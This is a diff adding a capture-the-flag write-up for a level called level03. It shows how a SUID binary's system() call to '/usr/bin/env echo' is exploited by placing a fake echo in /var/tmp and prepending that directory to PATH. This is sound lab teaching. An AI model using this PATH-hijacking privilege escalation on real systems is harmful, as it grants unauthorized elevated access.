@@ -1,0 +1,73 @@
+# Level03 Solution
+
+## Initial Analysis
+
+When executing the `level03` binary, we get the message:
+```
+Exploit me
+```
+
+Checking file permissions with `ls -la level03`:
+```
+-rwsr-sr-x 1 flag03 level03 8627 Mar 5 2016 level03
+```
+
+### Permission Breakdown
+- **Owner**: flag03 (the target user we want to escalate to)
+- **SUID bit set** (`s` in `-rwsr-sr-x`): The binary executes with the privileges of the owner (flag03) rather than the user running it (level03)
+- This means when we run `./level03`, it runs as flag03, giving us potential privilege escalation
+
+## Binary Analysis
+
+Using radare2 to decompile the binary:
+```bash
+r2 -qc "aaa; s sym.main; pdc" ./level03 > main_decompiled.c
+```
+
+Key findings from the decompiled code:
+```c
+sym.imp.getegid()
+sym.imp.geteuid()
+sym.imp.setresgid()
+sym.imp.setresuid()
+sym.imp.system("/usr/bin/env echo Exploit me")
+```
+
+The program sets its effective UID/GID to flag03, then executes a system command.
+
+## Finding the Vulnerability
+
+Searching for executable paths in the binary:
+```bash
+strings -tx ./level03 | grep -iE '/bin|/usr|sh|bash'
+```
+
+Critical finding:
+```
+5e0 /usr/bin/env echo Exploit me
+```
+
+**The vulnerability**: The program uses `system("/usr/bin/env echo Exploit me")` which:
+1. Calls `/usr/bin/env` to locate the `echo` command
+2. `env` searches for `echo` in the directories listed in `$PATH`
+3. We can manipulate `$PATH` to inject our own malicious `echo` binary
+
+## Exploitation
+
+Create a fake `echo` that executes `getflag`:
+```bash
+cp /bin/getflag /var/tmp/echo
+export PATH=/var/tmp:$PATH
+```
+
+Execute the vulnerable binary:
+```bash
+./level03
+```
+
+The program now executes our malicious `/var/tmp/echo` (which is actually `getflag`) with flag03 privileges, giving us the flag!
+
+## Key Concepts
+- **SUID exploitation**: Using SUID binaries to escalate privileges
+- **PATH hijacking**: Manipulating environment variables to execute arbitrary code
+- **Insecure system() calls**: Using relative paths in privileged programs creates security vulnerabilities
